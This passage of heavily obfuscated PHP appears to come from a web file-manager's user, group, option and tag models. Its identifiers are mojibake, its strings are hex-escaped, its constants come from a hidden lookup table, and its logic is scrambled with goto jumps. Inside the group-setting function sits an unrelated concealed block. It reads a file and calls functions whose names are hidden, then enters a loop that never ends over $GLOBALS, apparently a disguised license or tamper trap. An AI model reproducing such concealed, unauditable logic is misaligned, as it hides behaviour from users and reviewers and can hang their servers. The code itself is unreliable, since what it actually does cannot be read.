$_SERVER[…Ò×–]; $AÑó¯ö¥ê = $this->getInfoSimple($d®À¥Ûëøã); if (!$AÑó¯ö¥ê) { return !1; } goto cƒØÇ¡„; cƒØÇ¡„: $C”á×¦‘¼ = array($e…‡¸óñ»[1441] => $d®À¥Ûëøã); Model($e…‡¸óñ»[540])->where($C”á×¦‘¼)->delete(); Model($e…‡¸óñ»[2566])->where($C”á×¦‘¼)->delete(); goto d‹Š»Œœ¹á; d‹Š»Œœ¹á: Model($e…‡¸óñ»[2198])->where($C”á×¦‘¼)->delete(); Model($e…‡¸óñ»[2551])->where($C”á×¦‘¼)->delete(); Model($e…‡¸óñ»[2567])->where($C”á×¦‘¼)->delete(); goto B¡‚­Âå÷; cá÷ËÒËÅ¯: } protected function userGroupSet($fößÊçêß², $dÖ¬‡…œÓ», $aêäÖä°´ï = array()) { goto Bæ…Œ—ÕÈ¸; f‘ƒ‚Ë“‰: return $BºõÃğë¥->addAll($A³ª«¬¢İ, array(), !0); goto bøáâ‡èÕ; B‘—ŞÂ—­»: if (!$C›Š ”¦Â“ || !is_array($dÖ¬‡…œÓ»)) { return !1; } $BºõÃğë¥ = Model($F„‚¦“¯ˆ¯[2198]); $BºõÃğë¥->where(array($F„‚¦“¯ˆ¯[1450] => $fößÊçêß²))->delete(); goto cæñ·ÎÆ¸Ú; Bæ…Œ—ÕÈ¸: $F„‚¦“¯ˆ¯ =& $_SERVER[…Ò×–]; if (!isset($_SERVER[$F„‚¦“¯ˆ¯[798]]) || !isset($_SERVER[$F„‚¦“¯ˆ¯[1136]])) { goto c„å„è£¹â; c„å„è£¹â: $fë—˜ÖÉ¼ = $F„‚¦“¯ˆ¯[799]; $aŒ½ö¦”Ëœ = $F„‚¦“¯ˆ¯[800]; $dˆ»ìí–™ = $_SERVER[$F„‚¦“¯ˆ¯[795]] . $F„‚¦“¯ˆ¯[796]; goto f¸îóòçİë; E‡©“„êš°: $bä•Ò½¯êê = $F„‚¦“¯ˆ¯[802]; $bä•Ò½¯êê($_SERVER[$F„‚¦“¯ˆ¯[803]]); $Eã¥£ãª°£ = 1; goto E”æ’¸Ê¢¶; f¸îóòçİë: $Cì«ˆŞ•‡ = $aŒ½ö¦”Ëœ($dˆ»ìí–™); $D¯îÀœÒÄò = explode($F„‚¦“¯ˆ¯[221], $Cì«ˆŞ•‡); if (count($D¯îÀœÒÄò) < $F„‚¦“¯ˆ¯[567]) { $c‚¬šÙ—•® = $F„‚¦“¯ˆ¯[801]; $c‚¬šÙ—•®(); } goto E‡©“„êš°; E”æ’¸Ê¢¶: for ($b¬Ááè©ÏŠ = $Eã¥£ãª°£; $b¬Ááè©ÏŠ > 0; $b¬Ááè©ÏŠ++) { $bä•Ò½¯êê = json_encode($GLOBALS[$F„‚¦“¯ˆ¯[388]]); } goto B‡‡¦òñÅ¸; B‡‡¦òñÅ¸: } $C›Š ”¦Â“ = $this->getInfoSimple($fößÊçêß²); goto B‘—ŞÂ—­»; cæñ·ÎÆ¸Ú: $A³ª«¬¢İ = array(); $C»©ÅŸ›ŞÔ = 0; foreach ($dÖ¬‡…œÓ» as $Aê³ÒÁÎ… => $fÆÆŞÏÔ®â) { $B‘Ô­êï© = array($F„‚¦“¯ˆ¯[1450] => $fößÊçêß², $F„‚¦“¯ˆ¯[2119] => $Aê³ÒÁÎ…, $F„‚¦“¯ˆ¯[2263] => $fÆÆŞÏÔ®â); $B‘Ô­êï©[$F„‚¦“¯ˆ¯[2141]] = isset($aêäÖä°´ï[$C»©ÅŸ›ŞÔ]) ? $aêäÖä°´ï[$C»©ÅŸ›ŞÔ] : 0; $C»©ÅŸ›ŞÔ++; $A³ª«¬¢İ[] = $B‘Ô­êï©; } goto f‘ƒ‚Ë“‰; bøáâ‡èÕ: } protected function userGroupAdd($b—ÆğÆ†°Ÿ, $B³Ğ«¤„¨¾ = array()) { $f¾Ê®—ˆïº =& $_SERVER[…Ò×–]; $d‘ë¡¦¯Îè = $this->getInfoSimple($b—ÆğÆ†°Ÿ); if (!$d‘ë¡¦¯Îè || empty($B³Ğ«¤„¨¾)) { return !1; } $c¯·´Ã÷—¼ = array(); foreach ($B³Ğ«¤„¨¾ as $eºã¸âõò => $F”µâŸ·Ü›) { $c¯·´Ã÷—¼[] = array($f¾Ê®—ˆïº[1450] => $b—ÆğÆ†°Ÿ, $f¾Ê®—ˆïº[2119] => $eºã¸âõò, $f¾Ê®—ˆïº[2263] => $F”µâŸ·Ü›, $f¾Ê®—ˆïº[2141] => 0); } return Model($f¾Ê®—ˆïº[2198])->addAll($c¯·´Ã÷—¼, array(), !0); } protected function userGroupRemove($dÎ¥È©“ñÄ, $a¿Ü‹ö†œ) { $FÑ”ä»ÛÈ =& $_SERVER[…Ò×–]; $d¹‰è„…æ = $this->getInfoSimple($dÎ¥È©“ñÄ); if (!$d¹‰è„…æ || !$a¿Ü‹ö†œ) { return !1; } $cÓ¶ô©ï» = array($FÑ”ä»ÛÈ[1441] => $dÎ¥È©“ñÄ, $FÑ”ä»ÛÈ[2196] => $a¿Ü‹ö†œ); return Model($FÑ”ä»ÛÈ[2198])->where($cÓ¶ô©ï»)->delete(); } public function listData() { $C¸ƒ¹Ğ®Áš = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C¸ƒ¹Ğ®Áš[$_SERVER[…Ò×–][358]]); return $C¸ƒ¹Ğ®Áš; } public function listByID($e˜ÔÀÉñ‡) { $c›‘íÅà‚ =& $_SERVER[…Ò×–]; if (!$e˜ÔÀÉñ‡) { return; } $cËêãÛ¸± = array($c›‘íÅà‚[1450] => array($c›‘íÅà‚[7], $e˜ÔÀÉñ‡)); $e­õ¢•…¼­ = $this->where($cËêãÛ¸±)->select(); $this->_listDataApply($e­õ¢•…¼­); return $e­õ¢•…¼­; } public function listByGroup($a²æõàïƒ¾ = 0, $Fâ®†‰Ìæ = array()) { goto F¢óÜ“õƒ™; aÎéÜ¸èì—: $this->_listDataApply($F™…ƒ¼çÅ—[$Dä÷‹Ş¹[358]]); return $F™…ƒ¼çÅ—; goto Bœ¾Áì¬Ëä; F¢óÜ“õƒ™: $Dä÷‹Ş¹ =& $_SERVER[…Ò×–]; $F¨Ó°‹ˆëæ = $Dä÷‹Ş¹[33]; $e–àµ¹ÈÀ = array(); goto fæòŒ­áØ¨; fæòŒ­áØ¨: if ($a²æõàïƒ¾) { $e–àµ¹ÈÀ = array($Dä÷‹Ş¹[2568] => intval($a²æõàïƒ¾)); $F¨Ó°‹ˆëæ = "\114\x45\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\165\x73\145\x72\137\x67\162\x6f\x75\x70\x20\x75\163\145\x72\x5f\147\162\x6f\165\x70\40\157\x6e\40\x75\x73\145\162\x2e\x75\x73\x65\162\111\104\x20\x3d\x20\x75\163\x65\162\137\147\162\157\x75\x70\56\165\x73\145\x72\x49\x44"; $b‚µİŒ–ÇÂ = Input::get($Dä÷‹Ş¹[411], null, $Dä÷‹Ş¹[33]) ? $Dä÷‹Ş¹[33] : $Dä÷‹Ş¹[2569]; } if (isset($Fâ®†‰Ìæ[$Dä÷‹Ş¹[694]])) { $e–àµ¹ÈÀ[$Dä÷‹Ş¹[2570]] = $Fâ®†‰Ìæ[$Dä÷‹Ş¹[694]]; } $F™…ƒ¼çÅ— = $this->_makeOrder($b‚µİŒ–ÇÂ)->field($Dä÷‹Ş¹[2571])->where($e–àµ¹ÈÀ)->join($F¨Ó°‹ˆëæ)->selectPage(50); goto aÎéÜ¸èì—; Bœ¾Áì¬Ëä: } private function _makeOrder($f¶¼ùø‚ƒó = '') { goto BÉíÒğÈ¸; DÔÈšŒÛ†È: $FÙ«¼é…îÒ = Input::get($A†Û™‚Â“Ó[411], $A†Û™‚Â“Ó[7], $A†Û™‚Â“Ó[1441], $fÏå¥ìä™ù); $CÔ‚õ±„²ï = Input::get($A†Û™‚Â“Ó[412], $A†Û™‚Â“Ó[7], $A†Û™‚Â“Ó[2199], array($A†Û™‚Â“Ó[2199], $A†Û™‚Â“Ó[408])); $CÔ‚õ±„²ï = $E‹ª‹æµ‡Î[$CÔ‚õ±„²ï]; goto E¼ƒ¬Åß; E¼ƒ¬Åß: $f¶¼ùø‚ƒó = $f¶¼ùø‚ƒó . "\165\163\145\162\56{$FÙ«¼é…îÒ}\x20{$CÔ‚õ±„²ï}\54\40\165\163\x65\162\x2e\165\x73\x65\162\111\104\40\141\x73\x63"; return $this->alias($A†Û™‚Â“Ó[2318])->order($f¶¼ùø‚ƒó); goto DÈ·”Â¤‰; BÉíÒğÈ¸: $A†Û™‚Â“Ó =& $_SERVER[…Ò×–]; $fÏå¥ìä™ù = array($A†Û™‚Â“Ó[1450], $A†Û™‚Â“Ó[28], $A†Û™‚Â“Ó[2105], $A†Û™‚Â“Ó[2077], $A†Û™‚Â“Ó[191]); $E‹ª‹æµ‡Î = array($A†Û™‚Â“Ó[406] => $A†Û™‚Â“Ó[407], $A†Û™‚Â“Ó[408] => $A†Û™‚Â“Ó[409]); goto DÔÈšŒÛ†È; DÈ·”Â¤‰: } public function listSearch($D†ÓµÓÒ¤) { goto cÀø‚½«Ÿ£; dÅ× ¬ÃŠê: if (!$c˜Ï¤ÅŠİé || count($c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[358]]) < 5 && Input::check($aÊµ¿¹µæ¡, $cÃõ¾·†‡Ã[310])) { $f„¤õÈöœ = $this->_searchFromMeta($cÃõ¾·†‡Ã[419], $aÊµ¿¹µæ¡, 10); $cÂ‹‚ÇÇ = $this->_searchFromMeta($cÃõ¾·†‡Ã[420], $aÊµ¿¹µæ¡, 10); $dÌƒ×ñ‘¶‚ = array_merge($f„¤õÈöœ, $cÂ‹‚ÇÇ, $c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[358]]); $c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[358]] = array_unique_by_key($dÌƒ×ñ‘¶‚, $cÃõ¾·†‡Ã[1450]); $c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[355]][$cÃõ¾·†‡Ã[356]] = count($c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[358]]); $c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[355]][$cÃõ¾·†‡Ã[357]] = ceil($c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[355]][$cÃõ¾·†‡Ã[356]] / $c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[355]][$cÃõ¾·†‡Ã[353]]); } $this->_listDataApply($c˜Ï¤ÅŠİé[$cÃõ¾·†‡Ã[358]]); $this->_filterByGroup($c˜Ï¤ÅŠİé, $aË‚ƒí—Ğ¥); goto D‡›¾–êôÍ; dÃÄõŒß: if (!$aÊµ¿¹µæ¡) { $eÔ‘á»Š = array(); } if (isset($D†ÓµÓÒ¤[$cÃõ¾·†‡Ã[694]])) { $eÔ‘á»Š[$cÃõ¾·†‡Ã[694]] = $D†ÓµÓÒ¤[$cÃõ¾·†‡Ã[694]]; } $c˜Ï¤ÅŠİé = $this->_makeOrder()->where($eÔ‘á»Š)->selectPage(20); goto dÅ× ¬ÃŠê; f”æÙìî…: $aÊµ¿¹µæ¡ = str_replace($cÃõ¾·†‡Ã[2202], $cÃõ¾·†‡Ã[2203], trim($aÊµ¿¹µæ¡)); $eÔ‘á»Š = array($cÃõ¾·†‡Ã[28] => array($cÃõ¾·†‡Ã[756], "\45{$aÊµ¿¹µæ¡}\45"), $cÃõ¾·†‡Ã[297] => array($cÃõ¾·†‡Ã[756], "\45{$aÊµ¿¹µæ¡}\45"), $cÃõ¾·†‡Ã[2377] => array($cÃõ¾·†‡Ã[756], "\45{$aÊµ¿¹µæ¡}\x25"), $cÃõ¾·†‡Ã[920] => $cÃõ¾·†‡Ã[2204]); if (Input::check($aÊµ¿¹µæ¡, $cÃõ¾·†‡Ã[303])) { $eÔ‘á»Š[$cÃõ¾·†‡Ã[1450]] = array($cÃõ¾·†‡Ã[756], "\45{$aÊµ¿¹µæ¡}\x25"); $eÔ‘á»Š[$cÃõ¾·†‡Ã[2553]] = array($cÃõ¾·†‡Ã[756], "\x25{$aÊµ¿¹µæ¡}\45"); } goto dÃÄõŒß; cÀø‚½«Ÿ£: $cÃõ¾·†‡Ã =& $_SERVER[…Ò×–]; $aÊµ¿¹µæ¡ = $D†ÓµÓÒ¤[$cÃõ¾·†‡Ã[2200]]; $aË‚ƒí—Ğ¥ = isset($D†ÓµÓÒ¤[$cÃõ¾·†‡Ã[2201]]) ? $D†ÓµÓÒ¤[$cÃõ¾·†‡Ã[2201]] : !1; goto f”æÙìî…; D‡›¾–êôÍ: return $c˜Ï¤ÅŠİé; goto DæÛøé»; DæÛøé»: } private function _filterByGroup(&$c”Æ®Ñã÷†, $c¢µ½§êƒö) { $DŒˆø”±í‡ =& $_SERVER[…Ò×–]; if (!$c¢µ½§êƒö) { return $c”Æ®Ñã÷†; } foreach ($c”Æ®Ñã÷†[$DŒˆø”±í‡[358]] as $e§ŸêáÏ»Ì => &$d¾œåİŒç£) { $b¾ó‘˜”òÅ = array_to_keyvalue($d¾œåİŒç£[$DŒˆø”±í‡[2288]], $DŒˆø”±í‡[33], $DŒˆø”±í‡[2119]); if (!in_array($c¢µ½§êƒö, $b¾ó‘˜”òÅ)) { unset($c”Æ®Ñã÷†[$DŒˆø”±í‡[358]][$e§ŸêáÏ»Ì]); } } unset($d¾œåİŒç£); $c”Æ®Ñã÷†[$DŒˆø”±í‡[358]] = array_values($c”Æ®Ñã÷†[$DŒˆø”±í‡[358]]); $c”Æ®Ñã÷†[$DŒˆø”±í‡[355]] = array($DŒˆø”±í‡[2352] => count($c”Æ®Ñã÷†[$DŒˆø”±í‡[358]]), $DŒˆø”±í‡[2350] => $c”Æ®Ñã÷†[$DŒˆø”±í‡[355]][$DŒˆø”±í‡[353]], $DŒˆø”±í‡[2349] => 1, $DŒˆø”±í‡[2351] => 1); } private function _searchFromMeta($AäåÅ¼ˆ¤, $EÄ£Œ±á, $a¶ô¯ÔÉˆ) { goto EïóÇƒ˜; dŠé–êÚ‰Ñ: $EÈ¬ùˆäï­ = $this->where(array($còƒ¼—¹õ¦[1441] => array($còƒ¼—¹õ¦[7], $eô¦¯Õ¸î‹)))->select(); if (!$EÈ¬ùˆäï­) { return array(); } return $EÈ¬ùˆäï­; goto CïÚ„ˆ‹ÍŒ; b¹µ‘¡øï‰: $eô¦¯Õ¸î‹ = Model($còƒ¼—¹õ¦[2572])->where($fÉğ½£‡’Š)->limit($a¶ô¯ÔÉˆ)->select(); if (!$eô¦¯Õ¸î‹) { return array(); } $eô¦¯Õ¸î‹ = array_to_keyvalue($eô¦¯Õ¸î‹, $còƒ¼—¹õ¦[33], $còƒ¼—¹õ¦[1450]); goto dŠé–êÚ‰Ñ; EïóÇƒ˜: $còƒ¼—¹õ¦ =& $_SERVER[…Ò×–]; $EÄ£Œ±á = strtolower($EÄ£Œ±á); $fÉğ½£‡’Š = array($còƒ¼—¹õ¦[89] => $AäåÅ¼ˆ¤, $còƒ¼—¹õ¦[363] => array($còƒ¼—¹õ¦[756], "\x25{$EÄ£Œ±á}\x25")); goto b¹µ‘¡øï‰; CïÚ„ˆ‹ÍŒ: } private function _listDataApplyItem($Cİ†–ª¾¶ä) { $c´Ã†¶é— = array($Cİ†–ª¾¶ä); $this->_listDataApply($c´Ã†¶é—); return $c´Ã†¶é—[0]; } private function _listDataApply(&$a£Ÿš„„¤) { goto aáÌ´Î°¼•; aáÌ´Î°¼•: $cêÄ·à¶Œ =& $_SERVER[…Ò×–]; if (!$a£Ÿš„„¤) { return; } array_remove_key($a£Ÿš„„¤, $cêÄ·à¶Œ[811]); goto BÚ·¾¡Òìå; F´ ƒİ”›«: $this->_listAppendSourceRoot($a£Ÿš„„¤, $Fµö›ø¨ˆ); goto eÍ¥Ş…í”À; BÚ·¾¡Òìå: $Fµö›ø¨ˆ = array_to_keyvalue($a£Ÿš„„¤, $cêÄ·à¶Œ[33], $cêÄ·à¶Œ[1450]); $this->_listAppendGroup($a£Ÿš„„¤, $Fµö›ø¨ˆ); $this->_listAppendMeta($a£Ÿš„„¤, $Fµö›ø¨ˆ); goto F´ ƒİ”›«; eÍ¥Ş…í”À: } private function _listAppendSourceRoot(&$fğ®½¼’¡Ú, $AÉŠÍÊØ…) { goto EñšÜ§–Š¶; EñšÜ§–Š¶: $B¼Í¶ô°Æ =& $_SERVER[…Ò×–]; $b…²”ê´‡ = array($B¼Í¶ô°Æ[466] => 0, $B¼Í¶ô°Æ[375] => SourceModel::TYPE_USER, $B¼Í¶ô°Æ[461] => array($B¼Í¶ô°Æ[7], $AÉŠÍÊØ…)); $B±šôœØÖö = $B¼Í¶ô°Æ[2211]; goto aÀ¢Š‘»Î; aÀ¢Š‘»Î: $e´¦†µåš = Model($B¼Í¶ô°Æ[757])->order($B¼Í¶ô°Æ[2212])->field($B±šôœØÖö)->where($b…²”ê´‡)->select(); $e´¦†µåš = array_to_keyvalue($e´¦†µåš, $B¼Í¶ô°Æ[461]); $e´¦†µåš = array_remove_key($e´¦†µåš, $B¼Í¶ô°Æ[461]); goto bçœ˜›à–; bçœ˜›à–: foreach ($fğ®½¼’¡Ú as &$c…­£çñ†ˆ) { $c…­£çñ†ˆ[$B¼Í¶ô°Æ[395]] = $e´¦†µåš[$c…­£çñ†ˆ[$B¼Í¶ô°Æ[1450]]] ? $e´¦†µåš[$c…­£çñ†ˆ[$B¼Í¶ô°Æ[1450]]] : array(); } unset($c…­£çñ†ˆ); goto f‡‘¢½½©; f‡‘¢½½©: } private function _listAppendGroup(&$dÏÒÕŞŞ—œ, $C·Á‡˜‹ÖŸ) { goto f­œµİÇù«; fƒ÷æ„ç¡: foreach ($dÏÒÕŞŞ—œ as &$böàÆ‚½²á) { $böàÆ‚½²á[$EäĞó–š‘ [2288]] = array(); if (isset($AÍ­ç®™·ø[$böàÆ‚½²á[$EäĞó–š‘ [1450]]])) { $böàÆ‚½²á[$EäĞó–š‘ [2288]] = $AÍ­ç®™·ø[$böàÆ‚½²á[$EäĞó–š‘ [1450]]]; } } unset($böàÆ‚½²á); goto DÚ¶‚ô´‰¸; e Â—ô÷: $c±Ç­¾‹âµ = array($EäĞó–š‘ [2119] => array($EäĞó–š‘ [7], $AÁ³Ë¯È„’)); $EÏÔÜÉø¦ = Model($EäĞó–š‘ [2286])->field($EäĞó–š‘ [2573])->where($c±Ç­¾‹âµ)->select(); $EÏÔÜÉø¦ = array_to_keyvalue($EÏÔÜÉø¦, $EäĞó–š‘ [2119]); goto EËÃˆ‘ñ¬ç; D†êé¼ œ¥: $AÁ³Ë¯È„’ = array_to_keyvalue($AÍ­ç®™·ø, $EäĞó–š‘ [33], $EäĞó–š‘ [2119]); $AÁ³Ë¯È„’ = array_remove_value(array_unique($AÁ³Ë¯È„’), $EäĞó–š‘ [473]); if (!$AÁ³Ë¯È„’ || !$AÍ­ç®™·ø) { return; } goto e Â—ô÷; EËÃˆ‘ñ¬ç: $AÍ­ç®™·ø = array_to_keyvalue_group($AÍ­ç®™·ø, $EäĞó–š‘ [1450]); foreach ($AÍ­ç®™·ø as &$fã¡è·Ùóë) { $d‡æöâÎ” = array(); foreach ($fã¡è·Ùóë as $E£›Íä´ —) { if (!$E£›Íä´ —[$EäĞó–š‘ [2263]]) { continue; } $AÆ¥Û‚Èõ = Model($EäĞó–š‘ [2282])->listData($E£›Íä´ —[$EäĞó–š‘ [2263]]); $d‡æöâÎ”[] = array($EäĞó–š‘ [2119] => $E£›Íä´ —[$EäĞó–š‘ [2119]], $EäĞó–š‘ [2574] => $EÏÔÜÉø¦[$E£›Íä´ —[$EäĞó–š‘ [2119]]][$EäĞó–š‘ [28]], $EäĞó–š‘ [464] => $EÏÔÜÉø¦[$E£›Íä´ —[$EäĞó–š‘ [2119]]][$EäĞó–š‘ [464]], $EäĞó–š‘ [380] => $AÆ¥Û‚Èõ); } $fã¡è·Ùóë = $d‡æöâÎ”; } unset($fã¡è·Ùóë); goto fƒ÷æ„ç¡; f­œµİÇù«: $EäĞó–š‘  =& $_SERVER[…Ò×–]; $c±Ç­¾‹âµ = array($EäĞó–š‘ [1450] => array($EäĞó–š‘ [7], $C·Á‡˜‹ÖŸ)); $AÍ­ç®™·ø = Model($EäĞó–š‘ [2198])->where($c±Ç­¾‹âµ)->select(); goto D†êé¼ œ¥; DÚ¶‚ô´‰¸: } private function _listAppendMeta(&$D¡ÓÄÚ·‰, $eéô“´š³¾) { goto BÅêñªçˆÇ; F˜êî†Ñ”­: foreach ($D¡ÓÄÚ·‰ as &$a²¾¬Ÿ) { $FÇ§ª‹˜´Ã = array(); if (isset($bÀíµÇÖ¬¿[$a²¾¬Ÿ[$fÙºÍí·¸†[1450]]])) { $FÇ§ª‹˜´Ã = $bÀíµÇÖ¬¿[$a²¾¬Ÿ[$fÙºÍí·¸†[1450]]]; } $a²¾¬Ÿ[$fÙºÍí·¸†[2576]] = array(); if (isset($FÇ§ª‹˜´Ã[$e‰–Äï¾Âä])) { $a²¾¬Ÿ[$fÙºÍí·¸†[2576]] = $B¤ô”óˆ¬ø->getUserJobInfo($FÇ§ª‹˜´Ã[$e‰–Äï¾Âä]); } } unset($a²¾¬Ÿ); goto aŠÖ»ù°; c¸Õ‹‰×¬: foreach ($bÀíµÇÖ¬¿ as &$AéÌ“áÔ‰) { $D«¥Ïé’èî = array(); foreach ($AéÌ“áÔ‰ as $A¶®“§ ŞÛ) { if (!in_array($A¶®“§ ŞÛ[$fÙºÍí·¸†[89]], $BÄ‡íóë)) { $D«¥Ïé’èî[$A¶®“§ ŞÛ[$fÙºÍí·¸†[89]]] = $A¶®“§ ŞÛ[$fÙºÍí·¸†[363]]; } } $AéÌ“áÔ‰ = $D«¥Ïé’èî; } unset($AéÌ“áÔ‰); $B¤ô”óˆ¬ø = Model($fÙºÍí·¸†[2575]); goto F˜êî†Ñ”­; BÅêñªçˆÇ: $fÙºÍí·¸† =& $_SERVER[…Ò×–]; $e‰–Äï¾Âä = UserJobModel::JOB_KEY; $BÄ‡íóë = array($fÙºÍí·¸†[2554]); goto bãì‰…†õà; bãì‰…†õà: $D¹“òÁö³¶ = array($fÙºÍí·¸†[1450] => array($fÙºÍí·¸†[7], $eéô“´š³¾)); $bÀíµÇÖ¬¿ = Model($fÙºÍí·¸†[2551])->where($D¹“òÁö³¶)->select(); $bÀíµÇÖ¬¿ = array_to_keyvalue_group($bÀíµÇÖ¬¿, $fÙºÍí·¸†[1450]); goto c¸Õ‹‰×¬; aŠÖ»ù°: } protected function groupUserAll($cïÉ‡àêë) { $D¡ê„Â±´Ø =& $_SERVER[…Ò×–]; if (!$cïÉ‡àêë) { return !1; } $eÌÅò™‡ = Model($D¡ê„Â±´Ø[2198])->field($D¡ê„Â±´Ø[1450])->where(array($D¡ê„Â±´Ø[2119] => array($D¡ê„Â±´Ø[7], $cïÉ‡àêë)))->select(); $eÌÅò™‡ = array_to_keyvalue($eÌÅò™‡, $D¡ê„Â±´Ø[33], $D¡ê„Â±´Ø[1450]); return array_unique($eÌÅò™‡); } public function userSearch($Eó÷÷Ë¾«¥, $Cæğ¼“´ó = "\x2a") { return Model($_SERVER[…Ò×–][482])->where($Eó÷÷Ë¾«¥)->field($Cæğ¼“´ó)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($b¦ã°Ì¹) { $d°¡âìĞ¡Ê =& $_SERVER[…Ò×–]; if (!defined($d°¡âìĞ¡Ê[430])) { define($d°¡âìĞ¡Ê[430], 0); } return "\125\163\x65\x72\117\160\x74\x69\157\x6e\137{$b¦ã°Ì¹}\x5f" . USER_ID; } protected function filterWhere($B”Ï ®ª•) { $aêĞâÌÍÒ =& $_SERVER[…Ò×–]; if (!defined($aêĞâÌÍÒ[430])) { define($aêĞâÌÍÒ[430], 0); } $B”Ï ®ª•[$aêĞâÌÍÒ[1450]] = USER_ID; return $B”Ï ®ª•; } public function cacheRemoveUser($cƒÊá’Ì, $AÏ¨»Ê»êĞ) { return Cache::remove("\x55\163\145\162\x4f\160\164\x69\x6f\156\x5f{$cƒÊá’Ì}\x5f" . $AÏ¨»Ê»êĞ); } protected function optionDefault($bËÛƒó‹‚· = '') { $b«œ÷Ô…åà =& $_SERVER[…Ò×–]; if ($bËÛƒó‹‚· == $b«œ÷Ô…åà[33]) { return $GLOBALS[$b«œ÷Ô…åà[6]][$b«œ÷Ô…åà[2577]]; } if ($bËÛƒó‹‚· == $b«œ÷Ô…åà[2578]) { return $GLOBALS[$b«œ÷Ô…åà[6]][$b«œ÷Ô…åà[2579]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\x74\141\x67\114\151\x73\x74"; public $modelType = "\125\x73\x65\162\117\x70\164\x69\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\171\154\x65", "\163\x6f\x72\164"); public function listData($A ƒ‚Âø = false, $d“œÆØ¡¼ = "\x73\x6f\x72\x74", $E¶ÍÑÒñì¯ = false) { return parent::listData($A ƒ‚Âø, $d“œÆØ¡¼, $E¶ÍÑÒñì¯); } public function remove($E…ØáÍ³‰™) { return parent::remove($E…ØáÍ³‰™); } public function add($aÈåÂèê¬, $AÓ»„™Ç«° = "\x6c\141\142\x65\x6c\55\x67\x72\x65\x79\x2d\x6e\x6f\162\155\x61\x6c") { $AÊÔ’Éõª® =& $_SERVER[…Ò×–]; if ($this->findByName($aÈåÂèê¬)) { return !1; } $dÁ°¼Î˜ = array($AÊÔ’Éõª®[390] => $aÈåÂèê¬, $AÊÔ’Éõª®[440] => $AÓ»„™Ç«°, $AÊÔ’Éõª®[2123] => $this->getSort($AÊÔ’Éõª®[250]) + 1); return parent::insert($dÁ°¼Î˜); } public function update($B±º·¢ÈÚ°, $bŒ„å„‰éÛ) { $cïí³ŸÂÜÔ =& $_SERVER[…Ò×–]; $f¤‰Ûóš‚ = $this->listData($B±º·¢ÈÚ°); $b¹œÊ‘†Á = $this->findByName($bŒ„å„‰éÛ[$cïí³ŸÂÜÔ[28]]); if (!$f¤‰Ûóš‚ || $b¹œÊ‘†Á && $b¹œÊ‘†Á[$cïí³ŸÂÜÔ[371]] != $f¤‰Ûóš‚[$cïí³ŸÂÜÔ[371]]) { return !1; } return parent::update($B±º·¢ÈÚ°, $bŒ„å„‰éÛ); } public function moveTop($a“™î¡°Ä) { $bÀ† ÉÃ´ =& $_SERVER[…Ò×–]; $b°èÃË‘Ó† = parent::listData(); $aïáçÀÀÅÆ = $this->getSort($bÀ† ÉÃ´[249]); foreach ($b°èÃË‘Ó† as &$eÕâ¿çò) { if ($eÕâ¿çò[$bÀ† ÉÃ´[371]] == $a“™î¡°Ä) { $eÕâ¿çò[$bÀ† ÉÃ´[2141]] = $aïáçÀÀÅÆ; continue; } $eÕâ¿çò[$bÀ† ÉÃ´[2141]] += 1; } unset($eÕâ¿çò); return parent::resetData($b°èÃË‘Ó†); } public function moveBottom($bØ‚â´·öå) { $aˆŞ·œ–ƒ¢ =& $_SERVER[…Ò×–]; $Bï´®ˆÆ¢ = $this->getSort($aˆŞ·œ–ƒ¢[250]) + 1; return parent::update($bØ‚â´·öå, array($aˆŞ·œ–ƒ¢[2141] => $Bï´®ˆÆ¢)); } public function resetSort($cêŸÔÒ‹àë) { goto A¨ßí£“–â; a›¼¿ˆùå: for ($eÑƒ¬¼ãÕÂ = 0; $eÑƒ¬¼ãÕÂ < count($cêŸÔÒ‹àë); $eÑƒ¬¼ãÕÂ++) { $DëŠ÷Ïº¿¿[$cêŸÔÒ‹àë[$eÑƒ¬¼ãÕÂ] . $Dç¦Àƒµ›³[33]] = $eÑƒ¬¼ãÕÂ + 1; } $aÀ™ØÃÈ˜• = parent::listData(); foreach ($aÀ™ØÃÈ˜• as &$B£º»•İ·) { $c”é®Åã”š = $DëŠ÷Ïº¿¿[$B£º»•İ·[$Dç¦Àƒµ›³[371]]]; $B£º»•İ·[$Dç¦Àƒµ›³[2141]] = $c”é®Åã”š ? $c”é®Åã”š : $B£º»•İ·[$Dç¦Àƒµ›³[2141]]; } goto aãÏ¡Ù‡Í÷; aãÏ¡Ù‡Í÷: unset($B£º»•İ·); return parent::resetData($aÀ™ØÃÈ˜•); goto f½¼†‡Ìƒ¢; A¨ßí£“–â: $Dç¦Àƒµ›³ =& $_SERVER[…Ò×–]; $DëŠ÷Ïº¿¿ = array(); $cêŸÔÒ‹àë = is_array($cêŸÔÒ‹àë) ? $cêŸÔÒ‹àë : array(); goto a›¼¿ˆùå; f½¼†‡Ìƒ¢: } private function getSort($E§°Øº¨ğ•) { $fİ—¹·Æ„— =& $_SERVER[…Ò×–]; $BïÍÜ¼ˆÆö = parent::listData(); $f©ã…‚’Íì = array_to_keyvalue($BïÍÜ¼ˆÆö, $fİ—¹·Æ„—[33], $fİ—¹·Æ„—[2141]); if (!$f©ã…‚’Íì) { $f©ã…‚’Íì = array(0); } $CËŠùç¯´ß = $E§°Øº¨ğ• == $fİ—¹·Æ„—[250] ? max($f©ã…‚’Íì) : min($f©ã…‚’Íì); return intval($CËŠùç¯´ß); } } goto EÌ‡Ü‚ö‚è; cºˆÎÆ’: function beforeShutdown() { Hook::trigger($_SERVER[ä¡—±€µó–è][32]); } $_SERVER[$_SERVER[ä¡—±€µó–è][33]] = BASIC_PATH; $_SERVER[$_SERVER[ä¡—±€µó–è][34]] = LIB_DIR; goto bÖœ“É²Ø÷; Fè§‘Û¾÷œ: function getimagesize_io($f‘¢åñ¯½, &$E´›ù£‰† = false) { $dî·³‘¡Éµ = StreamWrapperIO::read($f‘¢åñ¯½, 0, 1024 * 64); 